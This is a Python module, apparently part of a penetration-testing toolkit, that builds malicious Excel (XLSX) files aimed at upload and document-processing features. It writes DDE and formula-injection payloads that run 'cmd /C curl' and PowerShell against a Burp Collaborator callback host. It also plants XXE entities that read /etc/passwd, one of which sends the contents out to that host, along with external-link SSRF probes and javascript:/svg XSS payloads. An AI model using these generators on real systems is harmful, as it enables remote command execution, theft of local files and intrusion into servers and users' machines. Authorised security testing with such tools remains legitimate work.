import zipfile
import shutil
from pathlib import Path
from openpyxl import Workbook
import xml.etree.ElementTree as ET

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_xlsx_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('lfi'):
        lfi_dir = output_dir / 'lfi'
        lfi_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('info') or should_generate_type('info_leak'):
        info_dir = output_dir / 'info'
        info_dir.mkdir(exist_ok=True)
    
    if should_generate_type('ssrf'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=HYPERLINK("{base_url}/h1","click")'
        wb.save(ssrf_dir / "ssrf2_hyperlink.xlsx")
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = ssrf_dir / "ssrf1_workbook_rels.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_ssrf1"
            zip_ref.extractall(temp_dir)
        
        workbook_rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
        with open(workbook_rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="{base_url}/x1" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = ssrf_dir / "ssrf3_images_remote.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_ssrf3"
            zip_ref.extractall(temp_dir)
        
        drawings_dir = temp_dir / "xl" / "drawings"
        drawings_dir.mkdir(parents=True, exist_ok=True)
        with open(drawings_dir / "drawing1.xml", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<xdr:twoCellAnchor>
<xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>0</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from>
<xdr:to><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>
<xdr:pic>
<xdr:nvPicPr><xdr:cNvPr id="1" name="Picture 1"/><xdr:cNvPicPr/></xdr:nvPicPr>
<xdr:blipFill>
<a:blip r:link="rId10"/>
</xdr:blipFill>
</xdr:pic>
</xdr:twoCellAnchor>
</xdr:wsDr>''')
        
        drawings_rels_dir = drawings_dir / "_rels"
        drawings_rels_dir.mkdir(parents=True, exist_ok=True)
        with open(drawings_rels_dir / "drawing1.xml.rels", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-xlsx.png" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=HYPERLINK("https://{burp_collab}/ssrf-xlsx-https1","click")'
        wb.save(ssrf_dir / "ssrf4_https_hyperlink.xlsx")
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = ssrf_dir / "ssrf5_workbook_rels_https.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_ssrf5"
            zip_ref.extractall(temp_dir)
        
        workbook_rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
        with open(workbook_rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="https://{burp_collab}/x1-https" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('lfi'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=HYPERLINK("file:///etc/passwd","local")'
        wb.save(lfi_dir / "lfi4_hyperlink_file.xlsx")
    
    if should_generate_type('xxe'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = xxe_dir / "xxe5_sharedstrings.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe5"
            zip_ref.extractall(temp_dir)
        
        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-xlsx">%x;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = xxe_dir / "xxe6_sharedstrings_file.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe6"
            zip_ref.extractall(temp_dir)
        
        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
            f.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>&xxe;</t></si>
</sst>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = xxe_dir / "xxe7_sharedstrings_param.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe7"
            zip_ref.extractall(temp_dir)
        
        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-xlsx-param">
%remote;
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>&data;</t></si>
</sst>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = xxe_dir / "xxe8_workbook_doctype.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe8"
            zip_ref.extractall(temp_dir)
        
        workbook_path = temp_dir / "xl" / "workbook.xml"
        if workbook_path.exists():
            with open(workbook_path, 'r', encoding='utf-8') as f:
                content = f.read()
            content = content.replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
                                    f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [<!ENTITY xxe SYSTEM "{base_url}/xxe-xlsx-workbook">]>
''')
            content = content.replace('<workbook', '&xxe;<workbook')
            with open(workbook_path, 'w', encoding='utf-8') as f:
                f.write(content)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = 'Test'
        xlsx_path = xxe_dir / "xxe9_sharedstrings_nested.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xxe9"
            zip_ref.extractall(temp_dir)
        
        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-xlsx-nested">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-xlsx-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>''')
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=HYPERLINK("cmd:///c curl {base_url}/rce-xlsx-cmd1","click")'
        wb.save(rce_dir / "rce1_hyperlink_cmd.xlsx")
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=HYPERLINK("powershell://Invoke-WebRequest {base_url}/rce-xlsx-ps1","click")'
        wb.save(rce_dir / "rce2_hyperlink_powershell.xlsx")
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=DDE("cmd";"/C curl {base_url}/rce-xlsx-dde1";"!A0")A0'
        wb.save(rce_dir / "rce3_dde_cmd.xlsx")
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=cmd|\'/C curl {base_url}/rce-xlsx-dde2\'!A0'
        wb.save(rce_dir / "rce4_dde_pipe.xlsx")
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=@SUM(1+9)*cmd|\'/C curl {base_url}/rce-xlsx-dde3\'!A0'
        wb.save(rce_dir / "rce5_dde_sum.xlsx")
    
    if should_generate_type('xss'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=HYPERLINK("javascript:alert(1)","click ici")'
        wb.save(xss_dir / "xss1_hyperlink_js.xlsx")
        
        wb = Workbook()
        ws = wb.active
        xlsx_path = xss_dir / "xss2_customxml_svg.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_xss2"
            zip_ref.extractall(temp_dir)
        
        customxml_dir = temp_dir / "customXml"
        customxml_dir.mkdir(parents=True, exist_ok=True)
        with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
            f.write('<?xml version="1.0"?><xml><x><![CDATA[<svg onload=alert(1)>]]></x></xml>')
        
        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
        if sharedstrings_path.exists():
            tree = ET.parse(sharedstrings_path)
            root = tree.getroot()
            ns = {'main': 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'}
            si = root.find('.//main:si', ns)
            if si is not None:
                t = si.find('.//main:t', ns)
                if t is not None:
                    t.text = '<svg onload=alert(1)>'
            tree.write(sharedstrings_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('info'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=CELL("filename")'
        xlsx_path = info_dir / "info1_cell_filename.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_info1"
            zip_ref.extractall(temp_dir)
        
        core_path = temp_dir / "docProps" / "core.xml"
        if core_path.exists():
            tree = ET.parse(core_path)
            root = tree.getroot()
            ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
            creator = root.find('.//dc:creator', ns)
            if creator is not None:
                creator.text = '=CELL("filename")'
            else:
                creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
                creator.text = '=CELL("filename")'
            tree.write(core_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
    
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('info'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=INFO("version")'
        xlsx_path = info_dir / "info2_info_version.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_info2"
            zip_ref.extractall(temp_dir)
        
        core_path = temp_dir / "docProps" / "core.xml"
        if core_path.exists():
            tree = ET.parse(core_path)
            root = tree.getroot()
            ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
            creator = root.find('.//dc:creator', ns)
            if creator is not None:
                creator.text = '=INFO("version")'
            else:
                creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
                creator.text = '=INFO("version")'
            tree.write(core_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=INFO("system")'
        xlsx_path = info_dir / "info3_info_system.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_info3"
            zip_ref.extractall(temp_dir)
        
        core_path = temp_dir / "docProps" / "core.xml"
        if core_path.exists():
            tree = ET.parse(core_path)
            root = tree.getroot()
            ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
            creator = root.find('.//dc:creator', ns)
            if creator is not None:
                creator.text = '=INFO("system")'
            else:
                creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
                creator.text = '=INFO("system")'
            tree.write(core_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=NOW()'
        xlsx_path = info_dir / "info4_now.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_info4"
            zip_ref.extractall(temp_dir)
        
        core_path = temp_dir / "docProps" / "core.xml"
        if core_path.exists():
            tree = ET.parse(core_path)
            root = tree.getroot()
            ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
            creator = root.find('.//dc:creator', ns)
            if creator is not None:
                creator.text = '=NOW()'
            else:
                creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
                creator.text = '=NOW()'
            tree.write(core_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
        
        wb = Workbook()
        ws = wb.active
        ws['A1'] = '=INFO("directory")'
        xlsx_path = info_dir / "info5_info_directory.xlsx"
        wb.save(xlsx_path)
        
        with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_info5"
            zip_ref.extractall(temp_dir)
        
        core_path = temp_dir / "docProps" / "core.xml"
        if core_path.exists():
            tree = ET.parse(core_path)
            root = tree.getroot()
            ns = {'dc': 'http://purl.org/dc/elements/1.1/', 'cp': 'http://schemas.openxmlformats.org/package/2006/metadata/core-properties'}
            creator = root.find('.//dc:creator', ns)
            if creator is not None:
                creator.text = '=INFO("directory")'
            else:
                creator = ET.SubElement(root, '{http://purl.org/dc/elements/1.1/}creator')
                creator.text = '=INFO("directory")'
            tree.write(core_path, encoding='utf-8', xml_declaration=True)
        
        with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if should_generate_type('ssrf') or should_generate_type('xxe'):
        wb = Workbook()
        ws = wb.active
        ws['A1'] = f'=HYPERLINK("{base_url}/h1","click")'
        master_path = output_dir / "master.xlsx"
        wb.save(master_path)
        
        with zipfile.ZipFile(master_path, 'r') as zip_ref:
            temp_dir = output_dir / "temp_master"
            zip_ref.extractall(temp_dir)
        
        workbook_rels_path = temp_dir / "xl" / "_rels" / "workbook.xml.rels"
        with open(workbook_rels_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Target="{base_url}/x1" TargetMode="External"/>
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-xlsx.png" TargetMode="External"/>
</Relationships>''')
        
        sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
        with open(sharedstrings_path, 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [<!ENTITY % x SYSTEM "{base_url}/xxe-xlsx">%x;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
<si><t>test</t></si>
</sst>''')
        
        drawings_dir = temp_dir / "xl" / "drawings"
        drawings_dir.mkdir(parents=True, exist_ok=True)
        with open(drawings_dir / "drawing1.xml", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<xdr:twoCellAnchor>
<xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>0</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from>
<xdr:to><xdr:col>1</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>
<xdr:pic>
<xdr:nvPicPr><xdr:cNvPr id="1" name="Picture 1"/><xdr:cNvPicPr/></xdr:nvPicPr>
<xdr:blipFill>
<a:blip r:link="rId10"/>
</xdr:blipFill>
</xdr:pic>
</xdr:twoCellAnchor>
</xdr:wsDr>''')
        
        drawings_rels_dir = drawings_dir / "_rels"
        drawings_rels_dir.mkdir(parents=True, exist_ok=True)
        with open(drawings_rels_dir / "drawing1.xml.rels", 'w', encoding='utf-8') as f:
            f.write(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-xlsx.png" TargetMode="External"/>
</Relationships>''')
        
        with zipfile.ZipFile(master_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
            for file_path in temp_dir.rglob('*'):
                if file_path.is_file():
                    arcname = file_path.relative_to(temp_dir)
                    zip_ref.write(file_path, arcname)
        
        shutil.rmtree(temp_dir, ignore_errors=True)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'xlsx', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'xlsx', burp_collab, tech_filter)
